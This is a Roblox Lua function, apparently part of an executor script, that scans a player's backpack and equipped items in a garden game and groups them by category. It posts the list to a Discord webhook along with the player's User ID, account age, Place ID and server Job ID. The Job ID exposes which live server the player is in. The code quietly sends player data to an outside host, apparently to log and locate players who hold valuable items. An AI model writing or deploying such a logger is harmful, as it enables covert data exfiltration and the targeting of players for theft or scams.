--------------------------------------------------------------------
-- Discord webhook: grouped inventory snapshot
--   - Duplicates collapsed into "Name ×N" (omits ×1)
--   - Headers show "(X items / Y types)"
--------------------------------------------------------------------
local function sendBackpackToWebhook()
    local backpack = localPlayer:FindFirstChild("Backpack")
    if not backpack then warn("Backpack not found") return end

    local fruitLookup = {}
    for _, f in ipairs(FRUITS) do fruitLookup[f:lower()] = true end
    local crateLookup = {}
    for _, c in ipairs(CRATES) do crateLookup[c:lower()] = true end

    local function categorize(toolName)
        local n = toolName:lower()
        if n:find("shovel") or n:find("watering") or n:find("sprinkler")
            or n:find("mushroom") or n:find("trowel") or n:find("hoe")
            or n:find("rake") or n:find("fertilizer") then
            return "gear"
        end
        if crateLookup[n] or n:find("crate") then return "crate" end
        if n:find("pet") then return "pet" end
        if n:find("seed") or fruitLookup[n] then return "seed" end
        return "other"
    end

    -- Buckets are name -> count maps (grouped)
    local categorized = { seed = {}, pet = {}, gear = {}, crate = {}, other = {} }
    local equipped = {}

    local function addTo(bucket, name)
        bucket[name] = (bucket[name] or 0) + 1
    end

    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            addTo(categorized[categorize(tool.Name)], tool.Name)
        end
    end

    local character = localPlayer.Character
    if character then
        for _, tool in ipairs(character:GetChildren()) do
            if tool:IsA("Tool") then
                addTo(equipped, tool.Name)
            end
        end
    end

    local function bucketStats(bucket)
        local items, types = 0, 0
        for _, c in pairs(bucket) do
            items += c
            types += 1
        end
        return items, types
    end

    local seedItems,  seedTypes  = bucketStats(categorized.seed)
    local petItems,   petTypes   = bucketStats(categorized.pet)
    local gearItems,  gearTypes  = bucketStats(categorized.gear)
    local crateItems, crateTypes = bucketStats(categorized.crate)
    local otherItems, otherTypes = bucketStats(categorized.other)
    local eqItems,    eqTypes    = bucketStats(equipped)

    local total = seedItems + petItems + gearItems + crateItems + otherItems + eqItems

    -- Build "• Name ×N" list, sorted by count desc, omit ×1
    local function buildList(bucket)
        local keys = {}
        for k in pairs(bucket) do table.insert(keys, k) end
        if #keys == 0 then return "```\n— empty —\n```" end
        table.sort(keys, function(a, b)
            if bucket[a] == bucket[b] then return a < b end
            return bucket[a] > bucket[b]
        end)
        local lines = { "```" }
        for _, name in ipairs(keys) do
            local c = bucket[name]
            local entry = (c > 1) and ("• " .. name .. " ×" .. c) or ("• " .. name)
            table.insert(lines, entry)
            if #table.concat(lines, "\n") > 950 then
                table.insert(lines, "…")
                break
            end
        end
        table.insert(lines, "```")
        return table.concat(lines, "\n")
    end

    local function header(label, items, types)
        return string.format("%s (%d items / %d types)", label, items, types)
    end

    local accountAge = tostring(localPlayer.AccountAge) .. " days"
    local placeId = tostring(game.PlaceId)
    local jobId = (game.JobId ~= "" and game.JobId) or "studio"
    local serverPop = tostring(#Players:GetPlayers()) .. " players"

    local fields = {
        { name = "👤 User ID",     value = "```" .. tostring(localPlayer.UserId) .. "```", inline = true },
        { name = "📆 Account Age", value = "```" .. accountAge .. "```",                  inline = true },
        { name = "👥 In Server",   value = "```" .. serverPop .. "```",                   inline = true },

        { name = "🗺️ Place ID", value = "```" .. placeId .. "```", inline = false },
        { name = "🧩 Job ID",   value = "```" .. jobId   .. "```", inline = false },

        { name = "📦 Totals", value = string.format(
            "🌿 Seeds: `%d` • 🐾 Pets: `%d` • 🔧 Gear: `%d`\n📦 Crates: `%d` • ⚔️ Equipped: `%d` • ❓ Other: `%d`",
            seedItems, petItems, gearItems, crateItems, eqItems, otherItems
        ), inline = false },

        { name = "⚔️ " .. header("Equipped", eqItems, eqTypes), value = buildList(equipped), inline = false },
    }

    if seedItems  > 0 then table.insert(fields, { name = "🌿 " .. header("Seeds",  seedItems,  seedTypes),  value = buildList(categorized.seed),  inline = false }) end
    if petItems   > 0 then table.insert(fields, { name = "🐾 " .. header("Pets",   petItems,   petTypes),   value = buildList(categorized.pet),   inline = false }) end
    if gearItems  > 0 then table.insert(fields, { name = "🔧 " .. header("Gear",   gearItems,  gearTypes),  value = buildList(categorized.gear),  inline = false }) end
    if crateItems > 0 then table.insert(fields, { name = "📦 " .. header("Crates", crateItems, crateTypes), value = buildList(categorized.crate), inline = false }) end
    if otherItems > 0 then table.insert(fields, { name = "❓ " .. header("Other",  otherItems, otherTypes), value = buildList(categorized.other), inline = false }) end

    local payload = HttpService:JSONEncode({
        username = "Garden Logger",
        avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png",
        embeds = {{
            author = {
                name = localPlayer.DisplayName .. " • @" .. localPlayer.Name,
                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png"
            },
            title = "🌱 Inventory Snapshot",
            description = "```ansi\n\27[2;32mPlayer joined — full backpack scan captured.\27[0m\n```",
            color = 0x57F287,
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=420&height=420&format=png"
            },
            fields = fields,
            footer = {
                text = "Garden Logger • " .. total .. " total items",
                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png"
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    })

    pcall(function()
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
        print("Inventory report sent to Discord for: " .. localPlayer.Name)
    end)
end

